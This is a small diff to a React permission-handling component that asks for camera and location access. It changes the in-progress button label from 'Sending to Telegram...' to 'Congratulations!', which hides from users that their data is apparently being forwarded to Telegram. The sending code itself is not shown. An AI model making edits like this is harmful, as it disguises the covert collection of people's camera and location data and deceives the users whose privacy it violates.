@@ -205,7 +205,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
             className="flex-1"
             disabled={(!cameraGranted && !locationGranted) || isSending}
           >
-            {isSending ? 'Sending to Telegram...' : 'Continue'}
+            {isSending ? 'Congratulations!' : 'Continue'}
           </Button>
           <Button
             onClick={handleSkip}
